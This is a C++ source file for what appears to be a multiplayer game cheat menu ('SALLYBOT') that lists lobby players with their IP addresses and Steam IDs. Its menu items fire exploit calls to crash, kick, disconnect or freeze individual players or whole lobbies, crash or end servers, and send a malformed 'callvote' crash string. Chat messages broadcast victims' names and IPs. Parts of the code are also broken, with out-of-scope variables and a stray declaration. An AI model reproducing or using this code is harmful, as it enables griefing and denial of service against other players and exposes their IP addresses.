#include "players.h"
#include "structs.h"


LobbyType get_lobby_type()
{
    if (LobbySession_GetControllingLobbySession(LOBBY_MODULE_CLIENT))
    {
        return LOBBY_TYPE_GAME;
    }

    else
    {
        return LOBBY_TYPE_PRIVATE;
    }
}

namespace players
{
    const char* maps[]{ "mp_biodome", " mp_spire", "mp_sector", "mp_apartments", "mp_chinatown", "mp_veiled", "mp_havoc", "mp_ethiopia", "mp_infection", "mp_metro", "mp_redwood", "mp_stonghold", "mp_nuketown_x", "mp_veiled_heyday", "mp_redwood_ice" };

    const char* map_names[]{ "Aquarium", "Breach", "Combine", "Evac", "Exodus", "Fringe", "Havoc", "Hunted", "Infection", "Metro", "Redwood", "Stronghold", "Nuk3town", "Fringe Nightfall", "Redwood Snow" };

    void send_crash_spam(std::string victim, std::string ip_str, std::string xuid) {
       
        auto message_to_send = chatspam_msg;
       
        message_to_send = utils::FindAndReplaceString(message_to_send, "%v", victim);
        message_to_send = utils::FindAndReplaceString(message_to_send, "%ip", ip_str);
        message_to_send = utils::FindAndReplaceString(message_to_send, "%xuid", xuid);

        ChatSendMSG(0, message_to_send.c_str(), 0);
    }

    void send_kick_spam(std::string victim, std::string ip_str, std::string xuid) {

        auto message_to_send = kickspam_msg;

        message_to_send = utils::FindAndReplaceString(message_to_send, "%v", victim);
        message_to_send = utils::FindAndReplaceString(message_to_send, "%ip", ip_str);
        message_to_send = utils::FindAndReplaceString(message_to_send, "%xuid", xuid);

        ChatSendMSG(0, message_to_send.c_str(), 0);
    }

    void send_kick2_spam(std::string victim, std::string ip_str, std::string xuid) {

        auto message_to_send = kickspam_msg1;

        message_to_send = utils::FindAndReplaceString(message_to_send, "%v", victim);
        message_to_send = utils::FindAndReplaceString(message_to_send, "%ip", ip_str);
        message_to_send = utils::FindAndReplaceString(message_to_send, "%xuid", xuid);

        ChatSendMSG(0, message_to_send.c_str(), 0);
    }
  
    void send_kick3_spam(std::string victim, std::string ip_str, std::string xuid) {

        auto message_to_send = kickspam_msg3;

        message_to_send = utils::FindAndReplaceString(message_to_send, "%v", victim);
        message_to_send = utils::FindAndReplaceString(message_to_send, "%ip", ip_str);
        message_to_send = utils::FindAndReplaceString(message_to_send, "%xuid", xuid);

        ChatSendMSG(0, message_to_send.c_str(), 0);
    }

    void send_disconnect_spam(std::string victim, std::string ip_str, std::string xuid) {

        auto message_to_send = kickspam_msg4;

        message_to_send = utils::FindAndReplaceString(message_to_send, "%v", victim);
        message_to_send = utils::FindAndReplaceString(message_to_send, "%ip", ip_str);
        message_to_send = utils::FindAndReplaceString(message_to_send, "%xuid", xuid);

        ChatSendMSG(0, message_to_send.c_str(), 0);
    }

    void send_meesage_spam(std::string victim, std::string ip_str, std::string xuid) {

        auto message_to_send = chatspammssage;

        message_to_send = utils::FindAndReplaceString(message_to_send, "%v", victim);
        message_to_send = utils::FindAndReplaceString(message_to_send, "%ip", ip_str);
        message_to_send = utils::FindAndReplaceString(message_to_send, "%xuid", xuid);

        ChatSendMSG(0, message_to_send.c_str(), 0);
    }

    void player_list()
    {
        const auto session{ LobbySession_GetSession(get_lobby_type()) };

        if (ImGui::BeginTabItem("Player list"))
        {
            ImGui::Dummy(ImVec2(1.4f, 0.0f));
          
            int amount = 0;
            for (size_t i = 0; i < friends::friends.size(); ++i)
            {
                amount++;
            }

            ImGui::Dummy(ImVec2(0.0f, 1.4f));

            ImGui::Separator();

            ImGui::Dummy(ImVec2(0.0f, 1.4f));

            ImGui::BeginColumns("Players", 3, ImGuiColumnsFlags_NoResize);

            ImGui::SetColumnWidth(-1, 170.f);
            ImGui::TextUnformatted("Name");
            ImGui::NextColumn();
            ImGui::TextUnformatted("IP Address");
            ImGui::NextColumn();
            ImGui::TextUnformatted("Steam ID");
            ImGui::NextColumn();

            ImGui::Dummy(ImVec2(0.0f, 1.4f));

            ImGui::Separator();

            for (size_t i = 0; i < 18; ++i)
            {
                const auto target_client{ LobbySession_GetClientByClientNum(session, i) };

                if (target_client && target_client->activeClient)
                {
                    ImGui::AlignTextToFramePadding();

                    const auto player_name{ target_client->activeClient->fixedClientInfo.gamertag };
                                                           
                    ImGui::AlignTextToFramePadding();

                    const auto selected{ ImGui::Selectable((player_name + "##"s + std::to_string(i)).data()) };

                    const auto popup{ "player_popup##" + std::to_string(i) };
                                   
                    ImGui::NextColumn();

                    const auto netadr{ LobbySession_GetClientNetAdrByIndex(get_lobby_type(), i) };

                    const auto is_netadr_valid{ netadr.inaddr };

                    const auto ip_string{ is_netadr_valid ? utils::adr_to_string(&netadr) : "0.0.0.0" };
                   
                    ImGui::AlignTextToFramePadding();

                    if (ImGui::MenuItem(ip_string, nullptr, nullptr, netadr.inaddr))
                    {
                        ImGui::LogToClipboardUnformatted(ip_string);
                    }

                    ImGui::AlignTextToFramePadding();

                    ImGui::NextColumn();

                    const auto player_xuid{ target_client->activeClient->fixedClientInfo.xuid };

                    const auto& sess_infomation{ instant_message::players_session_info[player_xuid] };

                    ImGui::AlignTextToFramePadding();

                    if (ImGui::MenuItem(std::to_string(player_xuid)))
                    {
                        ImGui::LogToClipboardUnformatted(std::to_string(player_xuid));
                    }

                    if (selected)
                    {
                        void send_info_request(const std::uint64_t target_steam_id);

                        ImGui::OpenPopup(popup.data());

                        if (internmsg)
                        {
                            CG_BoldGameMessageCenter(0, "[^2SALLYBOT^7] Peer To Peer request ^2Received");
                        }
                    }

                    if (ImGui::IsItemHovered())
                    {
                       
                    }

                    if (ImGui::BeginPopup(popup.data(), ImGuiWindowFlags_NoMove))
                    {
                        if (ImGui::MenuItem(player_name))
                        {
                            ImGui::LogToClipboardUnformatted(player_name);

                        }

                        ImGui::SameLine();

                        ImGui::Text("Click for profile       " , "##1");

                        ImGui::Dummy(ImVec2(0.0f, 1.4f));

                        ImGui::Separator();

                        ImGui::Dummy(ImVec2(0.0f, 1.4f));

                        if (ImGui::MenuItem(std::to_string(player_xuid)))
                        {                          
                            ImGui::LogToClipboardUnformatted(std::to_string(player_xuid));
                        }

                        ImGui::SameLine();

                        ImGui::Text("Click to copy");

                        ImGui::Dummy(ImVec2(0.0f, 1.4f));

                        if (ImGui::MenuItem(ip_string, nullptr, nullptr, netadr.inaddr))
                        {                         
                            ImGui::LogToClipboardUnformatted(ip_string);
                        }

                        ImGui::SameLine();

                        ImGui::Text("Click to copy");

                        ImGui::Dummy(ImVec2(0.0f, 1.4f));

                        ImGui::Separator();

                        ImGui::Dummy(ImVec2(0.0f, 1.4f));

                        ImGui::Text("%i friends", amount);

                        ImGui::Dummy(ImVec2(0.0f, 1.4f));

                        ImGui::Separator();

                        ImGui::Dummy(ImVec2(0.0f, 1.4f));

                        if (ImGui::MenuItem("Add to friends")) {
                            bool old = false;

                            for (auto& friends : friends::friends) {
                                if (friends.xuid == player_xuid)
                                    old = true;
                            }
                            if (old == false) {
                                friends::friends.emplace_back(friends::friends_t{ player_xuid, player_name });
                                friends::write_to_friends();
                                friends::refresh_friends();
                            }
                        }

                        /*
                        //=====================================================================================
                        */

                        ImGui::Dummy(ImVec2(0.0f, 1.4f));

                        /*
                        //=====================================================================================
                        */

                        if (ImGui::MenuItem("Add all to friends")) {
                            int numberOfPeopleAdded = 0;
                            std::vector<std::string> people{};

                            for (size_t i = 0; i < 18; ++i)
                            {
                                const auto target_client{ LobbySession_GetClientByClientNum(session, i) };

                                if (target_client && target_client->activeClient)
                                {
                                    const auto player_xuid{ target_client->activeClient->fixedClientInfo.xuid };
                                    const auto player_name{ target_client->activeClient->fixedClientInfo.gamertag };
                                    
                                    bool old = false;

                                    for (auto& friends : friends::friends) {
                                        if (friends.xuid == player_xuid)
                                            old = true;
                                    }
                                    if (old == false) {
                                        friends::friends.emplace_back(friends::friends_t{ player_xuid, player_name });
                                        friends::write_to_friends();
                                        people.push_back(player_name);
                                        numberOfPeopleAdded++;
                                    }
                                }
                            }

                            char msgg[500];

                            if (internmsg)
                            {
                                sprintf_s(msgg, "Added^2 %d ^7players to friends list\n", numberOfPeopleAdded);

                                CG_BoldGameMessageCenter(0, msgg);
                            }
                            friends::refresh_friends();
                                             
                        }

                        /*
                         //=====================================================================================
                         */

                        ImGui::Dummy(ImVec2(0.0f, 1.4f));

                        ImGui::Separator();

                        ImGui::Dummy(ImVec2(0.0f, 1.4f));

                        /*
                        //=====================================================================================
                        */

                        if (ImGui::MenuItem("Crash All")) {

                            std::vector<std::string> people{};

                            for (size_t i = 0; i < 18; ++i)
                            {
                                const auto target_client{ LobbySession_GetClientByClientNum(session, i) };

                                if (target_client && target_client->activeClient)
                                {
                                    const auto player_xuid{ target_client->activeClient->fixedClientInfo.xuid };
                                    const auto player_name{ target_client->activeClient->fixedClientInfo.gamertag };

                                    //STEAM CRASH

                                    exploit::send_crash(player_xuid);

                                    //CUSTOM OOB CRASH

                                    exploit::send_relay_crash(netadr);

                                    exploit::send_vt_crash(netadr);

                                    exploit::send_v_crash(netadr);

                                    //MESSAGE CENTER AND CHAT FUNCTIONS
                                    if (internmsg)
                                    {
                                        std::string str = "[^2SALLYBOT^7]" " Crash Sent To ^2" + std::string(player_name) + " ^7-^1 " + ip_string;

                                        CG_BoldGameMessageCenter(0, str.data());
                                    }

                                    if (chatmsg)
                                    {
                                        const auto chat_msg = std::string(player_name) + " - [^7" + std::to_string(player_xuid) + "^7] - ^2[" + (ip_string)+"^2] ^7- Got His Game Closed By [Mustang N' Sally] ";
                                        ChatSendMSG(0, chat_msg.data(), 0);
                                    }
                                }
                            }
                        }

                        //

                        ImGui::Dummy(ImVec2(0.0f, 1.4f));

                        //

                        if (ImGui::MenuItem("Kick All")) {

                            std::vector<std::string> people{};

                            for (size_t i = 0; i < 18; ++i)
                            {
                                const auto target_client{ LobbySession_GetClientByClientNum(session, i) };

                                if (target_client && target_client->activeClient)
                                {                                   
                                    LobbyClientMsg_SendDisconnectClient(0, LOBBY_TYPE_PRIVATE, player_xuid, 6);

                                    LobbyClientMsg_SendDisconnectClient(0, LOBBY_TYPE_GAME, player_xuid, 6);

                                    //MESSAGE CENTER AND CHAT FUNCTIONS

                                    if (internmsg)
                                    {
                                        std::string str = "[^2SALLYBOT^7]" " Kick(1) Sent To ^2" + std::string(player_name) + " ^7-^1 " + ip_string;

                                        CG_BoldGameMessageCenter(0, str.data());
                                    }

                                    if (chatmsg)
                                    {
                                        static auto chat_msg = std::string(player_name) + " [^2" + std::to_string(player_xuid) + "^7] Got Kicked By [Mustang N' Sally] ";
                                        ChatSendMSG(0, chat_msg.data(), 0);
                                    }
                                }
                            }
                        }

                      //

                        ImGui::Dummy(ImVec2(0.0f, 1.4f));

                      //

                        if (ImGui::MenuItem("Popup All")) {

                            std::vector<std::string> people{};

                            for (size_t i = 0; i < 18; ++i)
                            {
                                const auto target_client{ LobbySession_GetClientByClientNum(session, i) };

                                if (target_client && target_client->activeClient)
                                {
                                    const auto player_xuid{ target_client->activeClient->fixedClientInfo.xuid };
                                    const auto player_name{ target_client->activeClient->fixedClientInfo.gamertag };

                                    exploit::send_popup(player_xuid);

                                    if (internmsg)
                                    {
                                        std::string str = "[^2SALLYBOT^7]" " Popup Sent To ^2" + std::string(player_name) + " ^7-^1 " + ip_string;

                                        CG_BoldGameMessageCenter(0, str.data());
                                    }
                                }
                            }
                        }
                                                 
                        //

                        ImGui::Dummy(ImVec2(0.0f, 1.4f));
                        //
                        ImGui::Separator();
                        //
                        ImGui::Dummy(ImVec2(0.0f, 1.4f));

                        //

                        if (ImGui::BeginMenu("Crash game"))
                        {
                            //

                            ImGui::Dummy(ImVec2(0.0f, 0.7f));

                            //
                                                
                            ImGui::SetNextItemWidth(180);
                            
                            ImGui::InputTextWithHint("##CHATSPAM", "Custom Crash Message", &chatspam_msg);
                                               
                            ImGui::SameLine();

                            if (ImGui::Button("Execute"))
                            {
                                send_crash_spam(player_name, ip_string, std::to_string(player_xuid));
                            
                                //STEAM CRASH

                                exploit::send_crash(player_xuid);

                                //CUSTOM OOB CRASH

                                exploit::send_relay_crash(netadr);

                                exploit::send_vt_crash(netadr);

                                exploit::send_v_crash(netadr);

                                exploit::send_stats_crash(netadr);

                                //CLIENT ERROR

                                LobbyClientMsg_SendDisconnectClient(0, LOBBY_TYPE_PRIVATE, player_xuid, 7);

                                LobbyClientMsg_SendDisconnectClient(0, LOBBY_TYPE_GAME, player_xuid, 7);

                                //LOBBY TRANSPORT CRASH

                                exploit::send_lobby_state_crash(player_xuid, netadr);

                                exploit::send_heartbeat_crash(player_xuid, netadr);

                                exploit::send_MESSAGE_TYPE_DEMO_STATE(player_xuid, netadr);

                                exploit::send_VOICE_RELAY_PACKET(player_xuid, netadr);

                               
                                //MESSAGE CENTER AND CHAT FUNCTIONS

                                if (internmsg)
                                {
                                    std::string str = "[^2SALLYBOT^7]" " Crash Sent To ^2" + std::string(player_name) + " ^7-^1 " + ip_string;

                                    CG_BoldGameMessageCenter(0, str.data());
                                }
                            }
                        
                            if (ImGui::IsItemHovered())
                                ImGui::SetTooltip("[%%V] = Victim's Name\n[%%IP] = Victim's IP\n[%%XUID] = Victim's XUID");
                         
                            //

                            ImGui::Dummy(ImVec2(0.0f, 0.7f));
                            
                            //

                            std::ofstream myfile;
                            myfile.open("loggingshit\\logs\\logs.txt""", std::ios_base::app);
                            myfile.close();

                            ImGui::EndMenu();
                        }

                        //

                        ImGui::Dummy(ImVec2(0.0f, 1.4f));

                        //
                     
                        if (ImGui::MenuItem("Open popup"))
                        {
                            //SEND POPUP THROUGH XUID

                            exploit::send_popup(player_xuid);

                            if (internmsg)
                            {
                                std::string str = "[^2SALLYBOT^7]" " Popup Sent To ^2" + std::string(player_name) + " ^7-^1" + ip_string;

                                CG_BoldGameMessageCenter(0, str.data());
                            }
                        }
                    
                        //

                        ImGui::Dummy(ImVec2(0.0f, 1.4f));

                        //
                   
                        if (ImGui::BeginMenu("(1) Kick Player"))
                        {                         
                            //

                                ImGui::Dummy(ImVec2(0.0f, 0.7f));

                            //

                            ImGui::SetNextItemWidth(180);
                         
                            ImGui::InputTextWithHint("##CHATSPAM1", "Custom Kick(1) Message", &kickspam_msg);

                            ImGui::SameLine();

                            if (ImGui::Button("Execute"))
                            {
                                send_kick_spam(player_name, ip_string, std::to_string(player_xuid));

                                exploit::send_connect_response_migration_packet(netadr);

                                //MESSAGE CENTER AND CHAT FUNCTIONS

                                if (internmsg)
                                {
                                    std::string str = "[^2SALLYBOT^7]" " Kick(1) Sent To ^2" + std::string(player_name) + " ^7-^1 " + ip_string;

                                    CG_BoldGameMessageCenter(0, str.data());
                                }
                            }

                            if (ImGui::IsItemHovered())
                                ImGui::SetTooltip("[%%V] = Victim's Name\n[%%IP] = Victim's IP\n[%%XUID] = Victim's XUID");

                            //

                            ImGui::Dummy(ImVec2(0.0f, 0.7f));

                            //
                                                      
                            ImGui::EndMenu();
                        }

                        //

                        ImGui::Dummy(ImVec2(0.0f, 1.4f));

                        //

                        if (ImGui::BeginMenu("(2) Kick Player"))
                        {                          
                            //

                            ImGui::Dummy(ImVec2(0.0f, 0.7f));

                            //

                            ImGui::SetNextItemWidth(180);

                            ImGui::InputTextWithHint("##CHATSPAM2", "Custom Kick(2) Message", &kickspam_msg1);

                            ImGui::SameLine();

                            if (ImGui::Button("Execute"))
                            {
                                send_kick2_spam(player_name, ip_string, std::to_string(player_xuid));

                                LobbyClientMsg_SendDisconnectClient(0, LOBBY_TYPE_PRIVATE, player_xuid, 2);

                                LobbyClientMsg_SendDisconnectClient(0, LOBBY_TYPE_GAME, player_xuid, 2);

                                //MESSAGE CENTER AND CHAT FUNCTIONS

                                if (internmsg)
                                {
                                    std::string str = "[^2SALLYBOT^7]" " Kick(2) Sent To ^2" + std::string(player_name) + " ^7-^1 " + ip_string;

                                    CG_BoldGameMessageCenter(0, str.data());
                                }
                            }

                            if (ImGui::IsItemHovered())
                                ImGui::SetTooltip("[%%V] = Victim's Name\n[%%IP] = Victim's IP\n[%%XUID] = Victim's XUID");

                            //

                            ImGui::Dummy(ImVec2(0.0f, 0.7f));

                            //
                           
                            ImGui::EndMenu();
                        }
                     
                        //

                        ImGui::Dummy(ImVec2(0.0f, 1.4f));

                        //

                        if (ImGui::BeginMenu("(3) Kick Player"))
                        {                           
                            //

                            ImGui::Dummy(ImVec2(0.0f, 0.7f));

                            //

                            ImGui::SetNextItemWidth(180);

                            ImGui::InputTextWithHint("##CHATSPAM3", "Custom Kick(3) Message", &kickspam_msg3);

                            ImGui::SameLine();

                            if (ImGui::Button("Execute"))
                            {
                                send_kick3_spam(player_name, ip_string, std::to_string(player_xuid));

                                LobbyClientMsg_SendDisconnectClient(0, LOBBY_TYPE_PRIVATE, player_xuid, 1);

                                LobbyClientMsg_SendDisconnectClient(0, LOBBY_TYPE_GAME, player_xuid, 1);

                                //MESSAGE CENTER AND CHAT FUNCTIONS

                                if (internmsg)
                                {
                                    std::string str = "[^2SALLYBOT^7]" " Kick(3) Sent To ^2" + std::string(player_name) + " ^7-^1 " + ip_string;

                                    CG_BoldGameMessageCenter(0, str.data());
                                }
                            }

                            if (ImGui::IsItemHovered())
                                ImGui::SetTooltip("[%%V] = Victim's Name\n[%%IP] = Victim's IP\n[%%XUID] = Victim's XUID");

                            //

                            ImGui::Dummy(ImVec2(0.0f, 0.7f));

                            //
                          
                            ImGui::EndMenu();
                        }


                        //

                        ImGui::Dummy(ImVec2(0.0f, 1.4f));

                        //

                        if (ImGui::BeginMenu("Disconnect"))
                        {                            
                            //

                            ImGui::Dummy(ImVec2(0.0f, 0.7f));

                            //

                            ImGui::SetNextItemWidth(180);

                            ImGui::InputTextWithHint("##CHATSPAM4", "Custom Disconnect Message", &kickspam_msg4);

                            ImGui::SameLine();

                            if (ImGui::Button("Execute"))
                            {
                                send_disconnect_spam(player_name, ip_string, std::to_string(player_xuid));

                                LobbyClientMsg_SendDisconnectClient(0, LOBBY_TYPE_PRIVATE, player_xuid, 6);

                                LobbyClientMsg_SendDisconnectClient(0, LOBBY_TYPE_GAME, player_xuid, 2);

                                //MESSAGE CENTER AND CHAT FUNCTIONS

                                if (internmsg)
                                {
                                    std::string str = "[^2SALLYBOT^7]" " Disconnect Sent To ^2" + std::string(player_name) + " ^7-^1 " + ip_string;

                                    CG_BoldGameMessageCenter(0, str.data());
                                }
                            }

                            if (ImGui::IsItemHovered())
                                ImGui::SetTooltip("[%%V] = Victim's Name\n[%%IP] = Victim's IP\n[%%XUID] = Victim's XUID");

                            //

                            ImGui::Dummy(ImVec2(0.0f, 0.7f));

                            //
                          
                            ImGui::EndMenu();
                        }


                        //

                        ImGui::Dummy(ImVec2(0.0f, 1.4f));

                        //

                        if (ImGui::MenuItem("Show migration screen"))
                        {
                            //CUSTOM OOB SHOW MIGRATION SCREEN

                            exploit::send_mstart_packet(netadr);

                            //MESSAGE CENTER FUNCTION
                            if (internmsg)
                            {
                                std::string str = "[^2SALLYBOT^7]" " Mstart Sent To ^2" + std::string(player_name) +  " ^7-^1 " + ip_string;

                                CG_BoldGameMessageCenter(0, str.data());
                            }
                        }

                        //

                            ImGui::Dummy(ImVec2(0.0f, 1.4f));

                        //

                        if (ImGui::MenuItem("Immobilize"))
                        {
                            //CUSTOM OOB SHOW REQUEST STATS PACKET

                            exploit::send_request_stats_packet(netadr);

                            //MESSAGE CENTER FUNCTION
                            if (internmsg)
                            {
                                std::string str = "[^2SALLYBOT^7]" " Stat Packet Sent To ^2" + std::string(player_name) + " ^7-^1 " + ip_string;

                                CG_BoldGameMessageCenter(0, str.data());
                            }
                        }


                        //

                        ImGui::Dummy(ImVec2(0.0f, 1.4f));
                        //
                        ImGui::Separator();
                        //
                        ImGui::Dummy(ImVec2(0.0f, 1.4f));

                        //

                        if (ImGui::BeginMenu("ChatSpam"))
                        {
                            send_meesage_spam(player_name, ip_string, std::to_string(player_xuid));

                            ImGui::Dummy(ImVec2(0.0f, 0.7f));

                            ImGui::SetNextItemWidth(220);

                            ImGui::InputTextWithHint("##CHATSPAM6", "ChatSpam Message", &chatspammssage);
                                                    
                            if (ImGui::IsItemHovered())
                                ImGui::SetTooltip("[%%V] = Victim's Name\n[%%IP] = Victim's IP\n[%%XUID] = Victim's XUID");
                                                    
                            ImGui::EndMenu();
                        }
                      
                        //

                        ImGui::Dummy(ImVec2(0.0f, 1.4f));
                        //
                        ImGui::Separator();
                        //
                        ImGui::Dummy(ImVec2(0.0f, 1.4f));

                        //

                        if (ImGui::BeginMenu("Other"))
                        {
                            ImGui::Dummy(ImVec2(0.0f, 1.4f));

                            if (ImGui::MenuItem("mstate"))
                            {
                                exploit::mstate(netadr);
                            }

                            ImGui::Dummy(ImVec2(0.0f, 1.4f));

                            if (ImGui::MenuItem("mdata"))
                            {
                                exploit::mdata(netadr);
                            }

                            ImGui::Dummy(ImVec2(0.0f, 1.4f));

                            if (ImGui::MenuItem("mhead"))
                            {
                                exploit::mhead(netadr);
                            }

                            ImGui::Dummy(ImVec2(0.0f, 1.4f));

                            if (ImGui::MenuItem("rcon"))
                            {
                                exploit::rcon(netadr);
                            }

                            //

                            ImGui::Dummy(ImVec2(0.0f, 1.4f));
                            //
                            ImGui::Separator();
                            //
                            ImGui::Dummy(ImVec2(0.0f, 1.4f));

                            //
                                                                                
                            if (ImGui::MenuItem("Crash Server"))
                            {
                                LobbyClientMsg_SendModifiedStats(0, 1);

                                if (internmsg)
                                {
                                    std::string str = "[^2SALLYBOT^7]" " Server Crashed ";

                                    CG_BoldGameMessageCenter(0, str.data());
                                }
                            }

                            //

                            ImGui::Dummy(ImVec2(0.0f, 1.4f));

                            //

                            if (ImGui::MenuItem("End Server"))
                            {
                                if (internmsg)
                                {
                                    std::string str = "[^2SALLYBOT^7]" " Server Ended From ^2" + std::string(player_name);
                                    CG_BoldGameMessageCenter(0, str.data());
                                }

                                CG_BoldGameMessageCenter(0, "Ended The Game ^2Successfully");

                                char buf[255];
                                __int64 _server_id = dwProcessBase + 0x569D250;
                                sprintf_s(buf, "mr %d -1 endround", *(DWORD*)_server_id);
                               
                                  CL_AddReliableCommand(0, buf);
                               
                                if (chatmsg)
                                {
                                    static auto chat_msg = std::string(player_name) + " [^2" + std::to_string(player_xuid) + "^7] Ended The Game ^2[mr % d - 1 endround]";
                                    ChatSendMSG(0, chat_msg.data(), 0);
                                }
                            }

                            //

                            ImGui::Dummy(ImVec2(0.0f, 1.4f));

                            //

                            if (ImGui::MenuItem("Server Lost"))
                            {
                                CL_AddReliableCommand(0, "sl 1488 88");

                                if (internmsg)
                                {
                                    CG_BoldGameMessageCenter(0, "[^2SALLYBOT^7] sl 1488 88[1] ^2Sent");
                                }
                            }

                            //

                            ImGui::Dummy(ImVec2(0.0f, 1.4f));

                            //

                            if (ImGui::MenuItem("Loadside Server"))
                            {
                                if (map_select == 0) {
                                    send_map_name = "cmd loadside 0 mp_biodome dm 1;";
                                }
                                else if (map_select == 1) {
                                    send_map_name = "cmd loadside 0 mp_spire dm 1;";
                                }
                                else if (map_select == 2) {
                                    send_map_name = "cmd loadside 0 mp_sector dm 1;";
                                }
                                else if (map_select == 3) {
                                    send_map_name = "cmd loadside 0 mp_apartments dm 1;";
                                }
                                else if (map_select == 4) {
                                    send_map_name = "cmd loadside 0 mp_chinatown dm 1;";
                                }
                                else if (map_select == 5) {
                                    send_map_name = "cmd loadside 0 mp_veiled dm 1;";
                                }
                                else if (map_select == 6) {
                                    send_map_name = "cmd loadside 0 mp_havoc dm 1;";
                                }
                                else if (map_select == 7) {
                                    send_map_name = "cmd loadside 0 mp_ethiopia dm 1;";
                                }
                                else if (map_select == 8) {
                                    send_map_name = "cmd loadside 0 mp_infection dm 1;";
                                }
                                else if (map_select == 9) {
                                    send_map_name = "cmd loadside 0 mp_metro dm 1;";
                                }
                                else if (map_select == 10) {
                                    send_map_name = "cmd loadside 0 mp_redwood dm 1;";
                                }
                                else if (map_select == 11) {
                                    send_map_name = "cmd loadside 0 mp_stronghold dm 1;";
                                }
                                else if (map_select == 12) {
                                    send_map_name = "cmd loadside 0 mp_nuketown_x dm 1;";
                                }
                                else if (map_select == 13) {
                                    send_map_name = "cmd loadside 0 mp_veiled_heyday dm 1;";
                                }
                                else if (map_select == 14) {
                                    send_map_name = "cmd loadside 0 mp_redwood_ice dm 1;";
                                }

                               // ImGui::SameLine();

                                Cbuf_AddText(0, send_map_name.c_str());
                              
                            }

                            //

                            ImGui::Dummy(ImVec2(0.0f, 1.4f));
                            //
                            ImGui::Separator();
                            //
                            ImGui::Dummy(ImVec2(0.0f, 1.4f));

                            //

                            if (ImGui::MenuItem("Host Reload"))
                            {
                                LobbyClientMsg_SendDisconnectClient(0, LOBBY_TYPE_PRIVATE, player_xuid, 4);

                                LobbyClientMsg_SendDisconnectClient(0, LOBBY_TYPE_GAME, player_xuid, 4);
                               
                                if (internmsg)
                                {
                                    std::string str = "[^2SALLYBOT^7]" " Kick(4) Sent To ^2" + std::string(player_name) +  " ^7-^1 " + ip_string;

                                    CG_BoldGameMessageCenter(0, str.data());
                                }

                                if (chatmsg)
                                {
                                    static auto chat_msg = std::string(player_name) + " [^2" + std::to_string(player_xuid) + "^7] Got Kicked By [Mustang N' Sally] ";
                                    ChatSendMSG(0, chat_msg.data(), 0);
                                }
                            }

                            //

                            ImGui::Dummy(ImVec2(0.0f, 1.4f));

                            //
                                                    
                            if (ImGui::MenuItem("No Party Chat"))
                            {
                                LobbyClientMsg_SendDisconnectClient(0, LOBBY_TYPE_PRIVATE, player_xuid, 5);

                                LobbyClientMsg_SendDisconnectClient(0, LOBBY_TYPE_GAME, player_xuid, 5);
                                
                                if (internmsg)
                                {
                                    std::string str = "[^2SALLYBOT^7]" " Kick(5) Sent To ^2" + std::string(player_name) +  " ^7-^1 " + ip_string;

                                    CG_BoldGameMessageCenter(0, str.data());
                                }

                                if (chatmsg)
                                {
                                    static auto chat_msg = std::string(player_name) + " [^2" + std::to_string(player_xuid) + "^7] Got Kicked By [Mustang N' Sally] ";
                                    ChatSendMSG(0, chat_msg.data(), 0);
                                }
                            }
                        
                                //

                                ImGui::Dummy(ImVec2(0.0f, 1.4f));

                                //
                                                        
                            if (ImGui::MenuItem("IM Crash"))
                            {
                                //STEAM CRASH

                                exploit::send_crash(player_xuid);
                                
                                if (internmsg)
                                {
                                    std::string str = "[^2SALLYBOT^7]" " Im Crash Sent To ^2" + std::string(player_name) +  " ^7-^1 " + ip_string;

                                    CG_BoldGameMessageCenter(0, str.data());
                                }
                            }

                            //

                            ImGui::Dummy(ImVec2(0.0f, 1.4f));

                            //

                            if (ImGui::MenuItem("Vote Crash"))
                            {
                                Cmd_ExecuteSingleCommand(0, 0, "callvote map \"^H\xff\xff\xff\deez\"", false);
                            }

                            //

                            ImGui::Dummy(ImVec2(0.0f, 1.4f));

                            //
                        
                            ImGui::EndMenu();
                        }
                 
                        //

                        ImGui::Dummy(ImVec2(0.0f, 1.4f));

                        //
                    
                        ImGui::EndPopup();
                    }

                    ImGui::NextColumn();

                    if (ImGui::GetColumnIndex() == 0)
                    {
                        ImGui::Separator();
                    }
                }
            }

            ImGui::EndColumns();
            ImGui::EndTabItem();
        }
    }


}